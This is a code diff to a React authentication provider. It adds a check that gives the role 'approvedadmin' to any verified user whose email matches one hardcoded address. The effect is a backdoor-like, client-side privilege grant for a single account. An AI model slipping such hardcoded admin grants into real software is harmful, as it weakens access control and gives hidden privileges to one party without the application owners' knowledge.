@@ -10,7 +10,11 @@ export function AuthProvider({ children }) {
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (u) => {
-      setUser(u);
+      if (u && u.email === 'www.7339596165@gmail.com' && u.emailVerified) {
+        setUser({ ...u, role: 'approvedadmin' });
+      } else {
+        setUser(u);
+      }
       setLoading(false);
     });
     return () => unsubscribe();
